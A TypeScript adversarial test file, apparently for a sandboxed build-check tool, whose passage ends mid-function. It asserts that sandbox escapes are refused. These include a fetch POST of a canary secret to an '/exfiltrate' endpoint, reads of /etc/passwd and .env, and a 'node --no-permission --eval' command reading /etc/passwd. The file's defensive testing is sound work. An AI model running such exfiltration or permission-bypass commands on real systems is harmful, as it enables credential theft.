import assert from "node:assert/strict";
import { chmod, cp, link, lstat, mkdir, mkdtemp, readFile, readdir, rename, rm, symlink, writeFile } from "node:fs/promises";
import { spawn, spawnSync } from "node:child_process";
import { join, resolve } from "node:path";
import test, { type TestContext } from "node:test";
import { ensureGraphDerivedCheck, confinedNodeTestLaunch, prepareFocusedCheck, readGraphDerivedCheckReceipt, runGraphDerivedCheck } from "../../src/commands/check.ts";
import { canonicalDigest, canonicalJson } from "../../src/core/canonical.ts";
import { loadSemanticGraph } from "../../src/graph/index.ts";
import { deriveWork, type WorkPacket } from "../../src/graph/work.ts";
import { withCandidateLock, candidateScope, materialiseCandidate, type CandidateSpec } from "../../src/realisation/index.ts";
import type { RealisationBasis } from "../../src/realisation/basis.ts";

const sourceRoot = resolve(import.meta.dirname, "../..");
const workspaceTemporaryRoot = process.env.TMPDIR === undefined ? resolve(sourceRoot, ".usf/tmp") : resolve(process.env.TMPDIR);
const manifestPath = "graph/manifests/self-host.json";
const profile = "urn:usf:profile:v3-self-host:1";
const workId = "urn:usf:work:realisation-basis-chain";
const targetPath = "tests/adversarial/realisation-check.test.ts";
type ProfileBoundPacket = WorkPacket & Readonly<{ realisationBasis: RealisationBasis }>;

async function assertConfinedNetworkNamespace(): Promise<void> {
  if (process.env.USF_BWRAP_NETWORK !== "isolated") return;
  const routes = (await readFile("/proc/net/route", "utf8")).trimEnd().split("\n");
  assert.equal(routes.length, 1, "the focused child network namespace exposes no route");
  await assert.rejects(() => readFile("/etc/passwd", "utf8"), { code: "ENOENT" }, "an unmounted host path remains absent");
  const repositoryRoot = process.env.USF_REPOSITORY_ROOT!;
  // The first two exist outside the cage and prove the refusal has force. The
  // third is a synthetic absolute root standing for any historical checkout: it
  // must be unreachable whether or not it exists, and naming a real development
  // machine path here would itself be the dependency the containment check bans.
  for (const path of [join(repositoryRoot, ".env"), join(repositoryRoot, ".usf/home"), "/usf-historical-source/GOAL.md"]) {
    await assert.rejects(
      () => readFile(path, "utf8"),
      (error: unknown) => error instanceof Error && "code" in error && ["ENOENT", "ERR_ACCESS_DENIED"].includes(String(error.code)),
      `confined credential or historical read must fail: ${path}`,
    );
  }
  await assert.rejects(
    () => writeFile("/tmp/usf-candidate-escape", "refused\n", "utf8"),
    (error: unknown) => error instanceof Error && "code" in error && ["ENOENT", "ERR_ACCESS_DENIED"].includes(String(error.code)),
    "a write outside the candidate and controlled scratch must fail",
  );
  assert.throws(
    () => spawnSync("/usr/bin/true"),
    (error: unknown) => error instanceof Error && "code" in error && error.code === "ERR_ACCESS_DENIED",
    "an unapproved child process must fail",
  );
  const secretCanary = "sk-usf-adversarial-canary-do-not-exfiltrate";
  await assert.rejects(
    () => fetch("http://192.0.2.1:9/exfiltrate", {
      method: "POST",
      body: secretCanary,
      signal: AbortSignal.timeout(1_000),
    }),
    "a route-free namespace must refuse the network and canary exfiltration attempt",
  );
  assert.equal(process.env.NODE_OPTIONS, undefined, "the focused child receives no ambient Node options");
}

function lockProcessUnavailable(context: TestContext): boolean {
  const permission = (process as typeof process & { permission?: { has(scope: string): boolean } }).permission;
  if (permission === undefined || permission.has("child_process")) return false;
  context.skip("lock-owning USF operations are proven by the direct outer component validation");
  return true;
}

async function fixture(context: TestContext): Promise<string> {
  await mkdir(workspaceTemporaryRoot, { recursive: true, mode: 0o700 });
  const parent = await mkdtemp(join(workspaceTemporaryRoot, "usf-focused-check-"));
  const root = join(parent, "repo");
  await mkdir(root);
  for (const entry of await readdir(sourceRoot, { withFileTypes: true })) {
    if (entry.name === ".git" || entry.name === "node_modules" || entry.name.startsWith(".usf")) continue;
    await cp(join(sourceRoot, entry.name), join(root, entry.name), { recursive: true });
  }
  context.after(() => rm(parent, { recursive: true, force: true }));
  return root;
}

function basisFor(root: string, selectedManifest = manifestPath): RealisationBasis {
  const result = deriveWork(loadSemanticGraph(root, selectedManifest), { profile, selector: workId });
  const packet = result.items?.[0] as ProfileBoundPacket | undefined;
  assert.equal(result.status, "ok");
  assert.ok(packet?.realisationBasis);
  return packet.realisationBasis;
}

async function candidate(root: string, nonce: string, selectedManifest = manifestPath): Promise<CandidateSpec> {
  const basis = basisFor(root, selectedManifest);
  const operations = [{ kind: "write" as const, path: targetPath, content: await readFile(join(root, targetPath), "utf8") }];
  const acceptedContributionDigests = [canonicalDigest({ nonce })];
  return {
    digest: canonicalDigest({ basisDigest: basis.basisDigest, operations, acceptedContributionDigests }, { rejectAbsolutePaths: true }),
    basis,
    operations,
    lineage: { acceptedContributionDigests, rejected: [] },
    scope: candidateScope(basis),
    writeSet: [targetPath],
    preimages: { [targetPath]: basis.scope.preimages[targetPath]! },
  };
}

type InterruptionMode = "before-effect" | "before-persist" | "pending-synced" | "receipt-published" | "before-ack" | "pre-spawn-manifest-drift" | "legacy" | "ensure" | "preflight";

async function checkSubprocess(root: string, digest: string, validationId: string, mode: InterruptionMode) {
  const receiptPath = join(root, ".usf/receipts/check", digest.slice(7), `${canonicalDigest(validationId).slice(7)}.json`);
  const child = spawn(process.execPath, [join(sourceRoot, "tests/fixtures/realisation/check-interruption.ts"),
    root, digest, validationId, mode, `${receiptPath}.pending`], {
    cwd: root, env: {}, stdio: ["ignore", "pipe", "pipe", "ipc"],
  });
  let reached = false, preSpawnManifestDrifted = false, launches = 0, successfulExits = 0, stderr = "", stdout = "";
  let result: { status: string; reasonCode?: string; disposition?: string; receipt?: { receiptDigest: string } } | undefined;
  child.stderr!.on("data", chunk => { stderr += String(chunk); });
  child.stdout!.on("data", chunk => { stdout += String(chunk); });
  child.on("message", (message: unknown) => {
    if (message === null || typeof message !== "object") return;
    const event = message as Record<string, unknown>;
    if (event.kind === "validation-spawn") launches++;
    if (event.kind === "validation-exit" && event.code === 0 && event.signal === null) successfulExits++;
    if (event.kind === "result" || event.kind === "unexpected-result") result = event.result as typeof result;
    if (event.kind === "pre-spawn-manifest-drift") preSpawnManifestDrifted = true;
    if (event.kind === "boundary" && event.boundary === mode) {
      reached = true;
      child.kill("SIGKILL");
    }
  });
  const timeout = setTimeout(() => child.kill("SIGKILL"), 120_000);
  try {
    const ended = await new Promise<{ code: number | null; signal: NodeJS.Signals | null }>((accept, reject) => {
      child.once("error", reject);
      child.once("close", (code, signal) => accept({ code, signal }));
    });
    assert.equal(stdout, "", stderr);
    if (["pre-spawn-manifest-drift", "legacy", "ensure", "preflight"].includes(mode)) {
      assert.equal(ended.code, 0, stderr);
      assert.equal(ended.signal, null);
      assert.ok(result, stderr);
    } else {
      assert.equal(reached, true, JSON.stringify({ mode, result, ended, launches, successfulExits, stderr }));
      assert.equal(ended.signal, "SIGKILL");
    }
    return { launches, successfulExits, preSpawnManifestDrifted, result, receiptPath };
  } finally { clearTimeout(timeout); }
}

test("native check interruption preserves authenticated unknown outcomes and reconciles genuine receipts without redispatch", async (context) => {
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const validationId = "urn:usf:validation:realisation-basis-chain-focused";
  for (const boundary of ["before-effect", "before-persist", "pending-synced", "receipt-published", "before-ack"] as const) {
    const spec = await candidate(root, `genuine-interruption-${boundary}`);
    const { workspace } = await materialiseCandidate(root, spec);
    const manifestPath = join(workspace, ".usf-workspace.json");
    const manifest = await readFile(manifestPath);
    const source = await readFile(join(workspace, targetPath));
    const workspaceIdentity = await lstat(workspace);
    const interrupted = await checkSubprocess(root, spec.digest, validationId, boundary);
    assert.equal(interrupted.launches, boundary === "before-effect" ? 0 : 1);
    assert.equal(interrupted.successfulExits, boundary === "before-effect" ? 0 : 1);
    const receiptPath = interrupted.receiptPath;
    const intentPath = receiptPath.replace(/\.json$/u, ".intent.json");
    const pendingPath = `${receiptPath}.pending`;
    const scratch = join(workspace, ".usf-check-tmp");
    const scratchViewTarget = join(scratch, "execution-view", targetPath);
    const scratchIdentity = boundary === "before-effect" ? await lstat(scratch) : null;
    const scratchBytes = boundary === "before-effect" ? await readFile(scratchViewTarget) : null;
    const originalIntentBytes = await readFile(intentPath);
    const intent = JSON.parse(originalIntentBytes.toString("utf8"));
    assert.equal(intent.state, boundary === "before-ack" ? "SETTLED" : "STARTED");
    assert.equal(intent.candidateDigest, spec.digest);
    assert.equal(intent.validationObligationIri, validationId);
    assert.equal(intent.originalConstructionBasisDigest, spec.basis.basisDigest);
    assert.equal(intent.workIri, spec.basis.work.id);
    assert.equal(intent.explicitProfileIri, spec.basis.selection.profile);
    assert.equal((await lstat(intentPath)).mode & 0o777, 0o600);
    const pendingBeforePreflight = boundary === "pending-synced"
      ? { bytes: await readFile(pendingPath), identity: await lstat(pendingPath) }
      : null;
    // This is native rederivation, not authentication by self-rehashed JSON.
    const preflight = await checkSubprocess(root, spec.digest, validationId, "preflight");
    assert.equal(preflight.launches, 0);
    assert.deepEqual(await readFile(intentPath), originalIntentBytes);
    const unknown = boundary === "before-effect" || boundary === "before-persist";
    if (unknown) {
      assert.equal(preflight.result?.reasonCode, "CHECK_EXECUTION_OUTCOME_UNKNOWN");
      await assert.rejects(() => lstat(receiptPath), { code: "ENOENT" });
      await assert.rejects(() => lstat(pendingPath), { code: "ENOENT" });
      if (scratchIdentity !== null && scratchBytes !== null) {
        assert.equal((await lstat(scratch)).ino, scratchIdentity.ino);
        assert.deepEqual(await readFile(scratchViewTarget), scratchBytes);
      }
      let unknownBytes: Buffer | undefined;
      for (const mode of ["legacy", "ensure", "legacy", "ensure"] as const) {
        const retry = await checkSubprocess(root, spec.digest, validationId, mode);
        assert.equal(retry.result?.status, "refused");
        assert.equal(retry.result?.reasonCode, "CHECK_EXECUTION_OUTCOME_UNKNOWN");
        assert.equal(retry.launches, 0);
        const bytes = await readFile(intentPath);
        const retained = JSON.parse(bytes.toString("utf8"));
        assert.deepEqual(retained, { ...intent, state: "UNKNOWN" });
        if (unknownBytes) assert.deepEqual(bytes, unknownBytes);
        unknownBytes = bytes;
        await assert.rejects(() => lstat(receiptPath), { code: "ENOENT" });
        if (scratchIdentity !== null && scratchBytes !== null) {
          assert.equal((await lstat(scratch)).ino, scratchIdentity.ino);
          assert.deepEqual(await readFile(scratchViewTarget), scratchBytes);
        }
      }
    } else {
      if (boundary === "pending-synced") {
        assert.ok(pendingBeforePreflight);
        const { bytes: pendingBytes, identity: pendingIdentity } = pendingBeforePreflight;
        assert.equal(JSON.parse(pendingBytes.toString("utf8")).exitCode, 0);
        assert.equal(preflight.result?.status, "authenticated");
        assert.equal(preflight.result?.disposition, "STARTED");
        assert.equal(preflight.launches, 0);
        assert.equal(preflight.successfulExits, 0);
        assert.deepEqual(await readFile(pendingPath), pendingBytes);
        assert.equal((await lstat(pendingPath)).ino, pendingIdentity.ino);
        assert.deepEqual(await readFile(intentPath), originalIntentBytes);
        await assert.rejects(
          () => readGraphDerivedCheckReceipt(root, spec.digest, validationId),
          { reasonCode: "CHECK_RECEIPT_PATH_UNSAFE" },
          "strict receipt reading does not admit a pending publication",
        );
        const saved = `${pendingPath}.held`;
        await rename(pendingPath, saved);
        await symlink(saved, pendingPath);
        try {
          for (const mode of ["legacy", "ensure"] as const) {
            const refused = await checkSubprocess(root, spec.digest, validationId, mode);
            assert.equal(refused.result?.status, "refused");
            assert.equal(refused.result?.reasonCode, "CHECK_RECEIPT_PATH_UNSAFE");
            assert.equal(refused.launches, 0);
            assert.equal((await lstat(pendingPath)).isSymbolicLink(), true);
            assert.deepEqual(await readFile(saved), pendingBytes);
            assert.deepEqual(await readFile(intentPath), originalIntentBytes);
          }
        } finally {
          await rm(pendingPath);
          await rename(saved, pendingPath);
        }
        assert.deepEqual(await readFile(pendingPath), pendingBytes);
      } else {
        assert.equal(preflight.result?.status, "authenticated");
      }
      const retainedReceiptPath = boundary === "pending-synced" ? pendingPath : receiptPath;
      const producedBytes = await readFile(retainedReceiptPath);
      const producedIdentity = await lstat(retainedReceiptPath);
      let authenticatedBytes: Buffer | undefined;
      for (const mode of ["legacy", "ensure", "legacy", "ensure"] as const) {
        const replay = await checkSubprocess(root, spec.digest, validationId, mode);
        assert.equal(replay.result?.status, "pass", replay.result?.reasonCode);
        assert.equal(replay.launches, 0);
        const authenticated = await readGraphDerivedCheckReceipt(root, spec.digest, validationId);
        assert.ok(authenticated);
        const settled = JSON.parse(await readFile(intentPath, "utf8"));
        assert.deepEqual(settled, { ...intent, state: "SETTLED", receiptDigest: authenticated.receipt.receiptDigest });
        const bytes = await readFile(receiptPath);
        assert.deepEqual(bytes, producedBytes);
        assert.equal((await lstat(receiptPath)).ino, producedIdentity.ino);
        if (authenticatedBytes) assert.deepEqual(bytes, authenticatedBytes);
        authenticatedBytes = bytes;
        await assert.rejects(() => lstat(pendingPath), { code: "ENOENT" });
      }
      const current = await checkSubprocess(root, spec.digest, validationId, "preflight");
      assert.equal(current.result?.status, "authenticated");
      assert.equal(current.launches, 0);
    }
    assert.deepEqual(await readFile(manifestPath), manifest);
    assert.deepEqual(await readFile(join(workspace, targetPath)), source);
    assert.equal((await lstat(workspace)).ino, workspaceIdentity.ino);
  }
});

test("retained-intent recovery refuses unsafe scratch roots and sibling runtime entries before dispatch", async (context) => {
  await assertConfinedNetworkNamespace();
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const validationId = "urn:usf:validation:realisation-basis-chain-focused";
  for (const scenario of ["unsafe-scratch", "unsafe-scratch-mode", "sibling-runtime"] as const) {
    const spec = await candidate(root, `recovery-${scenario}`);
    const { workspace } = await materialiseCandidate(root, spec);
    const interrupted = await checkSubprocess(root, spec.digest, validationId, "before-effect");
    assert.equal(interrupted.launches, 0);
    const intentPath = interrupted.receiptPath.replace(/\.json$/u, ".intent.json");
    const intentBytes = await readFile(intentPath);
    const scratch = join(workspace, ".usf-check-tmp");
    if (scenario === "unsafe-scratch") {
      const retained = `${scratch}.retained`;
      await rename(scratch, retained);
      await symlink(retained, scratch);
    } else if (scenario === "unsafe-scratch-mode") {
      await chmod(scratch, 0o755);
    } else {
      await mkdir(join(workspace, ".usf-check-runtime-sibling"), { mode: 0o700 });
    }
    for (const mode of ["preflight", "ensure"] as const) {
      const refused = await checkSubprocess(root, spec.digest, validationId, mode);
      assert.equal(refused.result?.status, "refused");
      assert.equal(refused.result?.reasonCode, "CANDIDATE_BASIS_MISMATCH");
      assert.equal(refused.launches, 0);
      assert.deepEqual(await readFile(intentPath), intentBytes);
    }
    if (scenario === "unsafe-scratch") assert.equal((await lstat(scratch)).isSymbolicLink(), true);
    else if (scenario === "unsafe-scratch-mode") assert.equal((await lstat(scratch)).mode & 0o777, 0o755);
    else assert.equal((await lstat(join(workspace, ".usf-check-runtime-sibling"))).isDirectory(), true);
  }
});

test("native check refuses post-view manifest drift before intent publication or child execution", async (context) => {
  await assertConfinedNetworkNamespace();
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const spec = await candidate(root, "pre-spawn-manifest-drift");
  const { workspace } = await materialiseCandidate(root, spec);
  const manifestPath = join(workspace, ".usf-workspace.json");
  const manifestBefore = await readFile(manifestPath);
  const validationId = "urn:usf:validation:realisation-basis-chain-focused";

  const result = await checkSubprocess(root, spec.digest, validationId, "pre-spawn-manifest-drift");
  assert.equal(result.preSpawnManifestDrifted, true);
  assert.equal(result.result?.status, "refused");
  assert.equal(result.result?.reasonCode, "CANDIDATE_BASIS_MISMATCH");
  assert.equal(result.launches, 0);
  assert.equal(result.successfulExits, 0);
  assert.deepEqual(await readFile(manifestPath), Buffer.concat([manifestBefore, Buffer.from("\n")]));
  await assert.rejects(() => lstat(result.receiptPath), { code: "ENOENT" });
  await assert.rejects(() => lstat(result.receiptPath.replace(/\.json$/u, ".intent.json")), { code: "ENOENT" });
});
test("focused checks rederive the persisted basis before enforcing the command allowlist", async (context) => {
  await assertConfinedNetworkNamespace();
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const spec = await candidate(root, "confinement");
  const { workspace } = await materialiseCandidate(root, spec);
  assert.equal(spec.basis.work.dependencies.some((dependency) => dependency.key === "tests/fixtures/providers/"), true);
  assert.deepEqual(
    await readFile(join(workspace, "tests/fixtures/providers/models-dev.json")),
    await readFile(join(root, "tests/fixtures/providers/models-dev.json")),
  );

  const refused = await prepareFocusedCheck(root, spec.digest, [], "anything");
  assert.equal(refused.status, "refused");
  assert.equal(refused.reasonCode, "CHECK_NOT_ALLOWLISTED");
  assert.equal(refused.basis?.basisDigest, spec.basis.basisDigest);

  const confined = await prepareFocusedCheck(root, spec.digest, [{
    id: "bounded-test",
    command: ["node", "--test", "--test-isolation=none", "tests/unit/providers/routing.test.ts"],
  }], "bounded-test");
  assert.equal(confined.status, "ready");
  if (confined.status !== "ready") return;
  assert.equal(confined.basis.basisDigest, spec.basis.basisDigest);
  assert.equal(confined.executable, "/usr/bin/bwrap");
  assert.equal(confined.arguments[0], "--unshare-user");
  assert.equal(confined.arguments.includes("--unshare-net"), true);
  assert.equal(confined.arguments.includes("--clearenv"), true);
  assert.equal(confined.arguments.includes("--permission"), true);
  const readPermissions = confined.arguments.filter((argument) => argument.startsWith("--allow-fs-read="));
  assert.equal(readPermissions[0], `--allow-fs-read=${confined.workspace}`);
  assert.equal(readPermissions.length, 5);
  assert.equal(readPermissions[1]?.endsWith("/node_modules"), true);
  assert.equal(readPermissions[2]?.endsWith("/.usf/cache"), true);
  assert.equal(readPermissions[3], "--allow-fs-read=/etc/passwd");
  assert.equal(readPermissions[4], "--allow-fs-read=/proc/net/route");
  assert.equal(confined.arguments.some((argument) => argument === "--allow-child-process" || argument === "--allow-net"), false);

  const externalDependencyRoot = join(root, "external-node-modules");
  await mkdir(externalDependencyRoot, { mode: 0o700 });
  assert.equal(confinedNodeTestLaunch(
    confined.workspace,
    join(confined.workspace, ".usf-check-tmp"),
    [externalDependencyRoot, resolve(sourceRoot, ".usf/cache")],
    ["node", "--test", "--test-isolation=none", "tests/unit/providers/routing.test.ts"],
  ), null, "an owner-controlled external directory cannot replace the configured V3 dependency root");

  const bypass = await prepareFocusedCheck(root, spec.digest, [{
    id: "permission-bypass",
    command: ["node", "--no-permission", "--eval", "import('node:fs').then((fs) => fs.readFileSync('/etc/passwd'))"],
  }], "permission-bypass");
  assert.equal(bypass.status, "refused");
  assert.equal(bypass.reasonCode, "CHECK_CONFINEMENT_UNAVAILABLE");

  const traversal = await prepareFocusedCheck(root, spec.digest, [{
    id: "test-traversal",
    command: ["node", "--test", "--test-isolation=none", "../../outside.test.ts"],
  }], "test-traversal");
  assert.equal(traversal.status, "refused");
  assert.equal(traversal.reasonCode, "CHECK_CONFINEMENT_UNAVAILABLE");
});

test("check refuses planted missing, fabricated and stale workspace authority", async (context) => {
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const allowlist = [{ id: "noop", command: ["node", "--test", "--test-isolation=none", "tests/unit/providers/routing.test.ts"] }] as const;
  const scenarios: Array<{ name: string; plant: (root: string, workspace: string) => Promise<void>; reason: string; graphDerived?: boolean }> = [
    {
      name: "validation not bound by the construction basis",
      plant: async () => undefined,
      reason: "CHECK_VALIDATION_NOT_BOUND",
      graphDerived: true,
    },
    {
      name: "missing persisted basis",
      plant: async (_root, workspace) => {
        const path = join(workspace, ".usf-workspace.json");
        const manifest = JSON.parse(await readFile(path, "utf8")) as Record<string, unknown>;
        delete manifest.basis;
        await writeFile(path, JSON.stringify(manifest));
      },
      reason: "INVALID_WORKSPACE_MANIFEST",
    },
    {
      name: "fabricated persisted basis",
      plant: async (_root, workspace) => {
        const path = join(workspace, ".usf-workspace.json");
        const manifest = JSON.parse(await readFile(path, "utf8")) as { basis: { inputs: { policyDigest: string } } };
        manifest.basis.inputs.policyDigest = canonicalDigest("fabricated");
        await writeFile(path, JSON.stringify(manifest));
      },
      reason: "INVALID_REALISATION_BASIS",
    },
    {
      name: "mutated basis-bound dependency",
      plant: async (_root, workspace) => {
        const path = join(workspace, "schemas/provider-config.schema.json");
        await writeFile(path, `${await readFile(path, "utf8")}\n`);
      },
      reason: "CANDIDATE_BASIS_MISMATCH",
    },
    {
      name: "mutated graph-declared directory leaf",
      plant: async (_root, workspace) => {
        const path = join(workspace, "tests/fixtures/providers/models-dev.json");
        await writeFile(path, `${await readFile(path, "utf8")}\n`);
      },
      reason: "CANDIDATE_BASIS_MISMATCH",
    },
    {
      name: "extra empty candidate directory",
      plant: async (_root, workspace) => {
        await mkdir(join(workspace, "tests/fixtures/providers/extra-empty"), { recursive: true });
      },
      reason: "CANDIDATE_BASIS_MISMATCH",
    },
    {
      name: "stale policy input",
      plant: async (repositoryRoot) => {
        const path = join(repositoryRoot, "config/privacy.json");
        await writeFile(path, `${await readFile(path, "utf8")}\n`);
      },
      reason: "STALE_REALISATION_BASIS",
    },
  ];

  for (const scenario of scenarios) {
    const spec = await candidate(root, scenario.name);
    const { workspace } = await materialiseCandidate(root, spec);
    await scenario.plant(root, workspace);
    const result = scenario.graphDerived === true
      ? await runGraphDerivedCheck(root, spec.digest, "urn:usf:validation:not-bound")
      : await prepareFocusedCheck(root, spec.digest, allowlist, "noop");
    assert.equal(result.status, "refused", scenario.name);
    assert.equal(result.reasonCode, scenario.reason, scenario.name);
    if (scenario.name === "stale policy input") break;
  }
});

test("graph-derived check persists one canonical owner-only receipt and refuses tampered readback", async (context) => {
  await assertConfinedNetworkNamespace();
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const spec = await candidate(root, "durable-graph-derived-receipt");
  await materialiseCandidate(root, spec);
  const validationId = "urn:usf:validation:realisation-basis-chain-focused";

  assert.equal(await readGraphDerivedCheckReceipt(root, spec.digest, validationId), null);
  // A separately held native lock is a deterministic competing-owner barrier.
  const busy = await withCandidateLock(root, spec.digest, () => ensureGraphDerivedCheck(root, spec.digest, validationId));
  assert.equal(busy.status, "refused");
  if (busy.status === "refused") assert.equal(busy.reasonCode, "CANDIDATE_BUSY");
  assert.equal(await readGraphDerivedCheckReceipt(root, spec.digest, validationId), null);
  const result = await ensureGraphDerivedCheck(root, spec.digest, validationId);
  assert.equal(result.status, "pass", result.status === "refused" ? result.reasonCode : undefined);
  if (result.status !== "pass") return;
  assert.equal(result.basis.basisDigest, spec.basis.basisDigest);
  assert.equal(result.receipt.schema, "urn:usf:checked-candidate-receipt:1");
  assert.equal(result.receipt.candidateDigest, spec.digest);
  assert.equal(result.receipt.originalConstructionBasisDigest, spec.basis.basisDigest);
  assert.equal(result.receipt.scopedDependencyDigest, spec.basis.work.scopedDependencyDigest);
  assert.equal(result.receipt.validationObligationIri, validationId);
  assert.deepEqual(result.receipt.validationCommandTokens, [
    "node", "--test", "--test-isolation=none", "tests/unit/providers/routing.test.ts", "tests/contract/fake-call-resolve.test.ts",
    "tests/unit/realisation/workspace.test.ts", "tests/adversarial/realisation-check.test.ts", "tests/integration/bootstrap-loop.test.ts",
  ]);
  assert.equal(result.receipt.validationEnvironmentIri, "urn:usf:environment:hermetic");
  assert.equal(result.receipt.validationExecutionModeIri, "urn:usf:mode:deterministic-test-substitute");
  assert.equal(result.receipt.validationToolDependencies.some((dependency) => dependency.kind === "host-tool" && dependency.id === "urn:usf:host-tool:bwrap:0.9.0"), true);
  assert.equal(result.receipt.exitCode, 0);
  const { receiptDigest, ...receiptWithoutDigest } = result.receipt;
  assert.equal(receiptDigest, canonicalDigest(receiptWithoutDigest, { rejectAbsolutePaths: true }));
  assert.equal(Object.keys(result.receipt).some((field) => ["timestamp", "createdAt", "runId"].includes(field)), false);

  const expectedPath = `.usf/receipts/check/${spec.digest.slice("sha256:".length)}/${canonicalDigest(validationId).slice("sha256:".length)}.json`;
  assert.equal(result.receiptPath, expectedPath);
  const receiptPath = join(root, result.receiptPath);
  const settledIntentPath = receiptPath.replace(/\.json$/u, ".intent.json");
  const settledIntent = JSON.parse(await readFile(settledIntentPath, "utf8"));
  assert.equal(settledIntent.state, "SETTLED");
  assert.equal(settledIntent.receiptDigest, result.receipt.receiptDigest);
  const receiptEntry = await lstat(receiptPath);
  assert.equal(receiptEntry.isSymbolicLink(), false);
  assert.equal(receiptEntry.isFile(), true);
  assert.equal(receiptEntry.mode & 0o777, 0o600);
  assert.equal(await readFile(receiptPath, "utf8"), canonicalJson(result.receipt, { rejectAbsolutePaths: true }));
  const authenticatedReadback = await readGraphDerivedCheckReceipt(root, spec.digest, validationId);
  assert.equal(authenticatedReadback?.receiptPath, expectedPath);
  assert.deepEqual(authenticatedReadback?.receipt, result.receipt);


  const scratch = join(root, ".usf/workspaces", spec.digest.slice("sha256:".length), ".usf-check-tmp");
  const sentinel = join(scratch, "reconcile-cleanup-sentinel");
  await writeFile(sentinel, "matching receipt requires controlled cleanup", { mode: 0o600 });
  const receiptIdentity = await lstat(receiptPath);
  await assert.rejects(() => readGraphDerivedCheckReceipt(root, spec.digest, validationId));
  for (let replay = 0; replay < 2; replay++) {
    const reused = await ensureGraphDerivedCheck(root, spec.digest, validationId);
    assert.deepEqual(reused, result);
    assert.equal((await lstat(receiptPath)).ino, receiptIdentity.ino);
    await assert.rejects(() => lstat(sentinel), { code: "ENOENT" });
  }
  const reusedBusy = await withCandidateLock(root, spec.digest, () => ensureGraphDerivedCheck(root, spec.digest, validationId));
  assert.equal(reusedBusy.status, "refused");
  if (reusedBusy.status === "refused") assert.equal(reusedBusy.reasonCode, "CANDIDATE_BUSY");
  assert.deepEqual(await ensureGraphDerivedCheck(root, spec.digest, validationId), result);
  await assert.rejects(() => lstat(sentinel), { code: "ENOENT" });

  const originalReceiptBytes = await readFile(receiptPath);
  const workspace = join(root, ".usf/workspaces", spec.digest.slice("sha256:".length));
  const workspaceEntry = await lstat(workspace);
  const workspaceManifest = await readFile(join(workspace, ".usf-workspace.json"));
  const workspaceSource = await readFile(join(workspace, targetPath));
  const workspaceEntries = (await readdir(workspace)).sort();
  const receiptEntries = (await readdir(join(root, ".usf/receipts/check", spec.digest.slice("sha256:".length)))).sort();
  const otherDigest = canonicalDigest({ deliberatelyDifferentCurrentnessClaim: true });
  type ReceiptPatch = Partial<typeof result.receipt>;
  const patches: Array<readonly [string, ReceiptPatch]> = [];
  for (const field of [
    "validationResourceDigest", "validationEnvironmentDigest", "validationExecutionModeDigest",
    "originalConstructionBasisDigest", "scopedDependencyDigest", "workspaceIdentityDigest",
    "lineageDigest", "byteDeltaDigest", "fileModeDigest", "candidateTreeDigest", "writeSetDigest",
  ] as const) patches.push([field, { [field]: otherDigest }]);
  patches.push(["work", { workIri: "urn:test:other-work" }], ["profile", { explicitProfileIri: "urn:test:other-profile:1" }]);
  const commandTokens = result.receipt.validationCommandTokens.map((token, index) => index === result.receipt.validationCommandTokens.length - 1 ? "tests/unit/providers/receipt-currentness-mismatch.test.ts" : token);
  patches.push(["command with consistent digest", { validationCommandTokens: commandTokens, validationCommandDigest: canonicalDigest(commandTokens) }]);
  patches.push(["environment identity and digest", { validationEnvironmentIri: "urn:test:other-environment", validationEnvironmentDigest: otherDigest }]);
  patches.push(["mode identity and digest", { validationExecutionModeIri: "urn:test:other-mode", validationExecutionModeDigest: otherDigest }]);
  const toolDependencies = [...result.receipt.validationToolDependencies, { kind: "basis-input" as const, id: "urn:test:extra-tool", digest: otherDigest }];
  patches.push(["tool claims with consistent digest", { validationToolDependencies: toolDependencies, validationToolDependencyDigest: canonicalDigest(toolDependencies, { rejectAbsolutePaths: true }) }]);
  const schemaDependencies = [...result.receipt.validationSchemaDependencies, { id: "urn:test:extra-schema", digest: otherDigest }];
  patches.push(["schema claims with consistent digest", { validationSchemaDependencies: schemaDependencies, validationSchemaDependencyDigest: canonicalDigest(schemaDependencies, { rejectAbsolutePaths: true }) }]);
  const authorityDependencies = result.receipt.validationAuthorityDependencies;
  assert(authorityDependencies.length > 0, "the genuine fixture must contain an out-of-workspace authority input for omission and byte-mismatch coverage");
  const extraPath = "tests/receipt-currentness-extra-input.txt";
  assert.equal(authorityDependencies.some(d => d.path === extraPath), false);
  for (const [label, dependencies] of [
    ["omitted runtime authority", authorityDependencies.slice(1)],
    ["extra runtime authority", [...authorityDependencies, { path: extraPath, digest: otherDigest }]],
    ["wrong runtime authority bytes", authorityDependencies.map((d, i) => i === 0 ? { ...d, digest: otherDigest } : d)],
  ] as const) patches.push([label, { validationAuthorityDependencies: dependencies, validationAuthorityDependencyDigest: canonicalDigest(dependencies, { rejectAbsolutePaths: true }) }]);
  try {
    for (const [label, patch] of patches) {
      const { receiptDigest: _oldDigest, ...draft } = { ...result.receipt, ...patch };
      const planted = { ...draft, receiptDigest: canonicalDigest(draft, { rejectAbsolutePaths: true }) };
      const bytes = canonicalJson(planted, { rejectAbsolutePaths: true });
      assert.notEqual(bytes, originalReceiptBytes.toString("utf8"), label);
      await writeFile(receiptPath, bytes, { mode: 0o600 });
      await assert.rejects(() => readGraphDerivedCheckReceipt(root, spec.digest, validationId), { reasonCode: "CHECK_RECEIPT_INVALID" }, label);
      const ensured = await ensureGraphDerivedCheck(root, spec.digest, validationId);
      assert.equal(ensured.status, "refused", label);
      if (ensured.status === "refused") assert.equal(ensured.reasonCode, "CHECK_RECEIPT_INVALID", label);
      assert.equal(await readFile(receiptPath, "utf8"), bytes, label + ": readback must not repair a rejected receipt");
      assert.equal((await lstat(workspace)).ino, workspaceEntry.ino, label);
      assert.deepEqual(await readFile(join(workspace, ".usf-workspace.json")), workspaceManifest, label);
      assert.deepEqual(await readFile(join(workspace, targetPath)), workspaceSource, label);
      assert.deepEqual((await readdir(workspace)).sort(), workspaceEntries, label);
      assert.deepEqual((await readdir(join(root, ".usf/receipts/check", spec.digest.slice("sha256:".length)))).sort(), receiptEntries, label);
    }
  } finally { await writeFile(receiptPath, originalReceiptBytes, { mode: 0o600 }); }
  assert.deepEqual((await readGraphDerivedCheckReceipt(root, spec.digest, validationId))?.receipt, result.receipt);

  const pendingPath = `${receiptPath}.pending`;
  const ensureUnsafe = async () => {
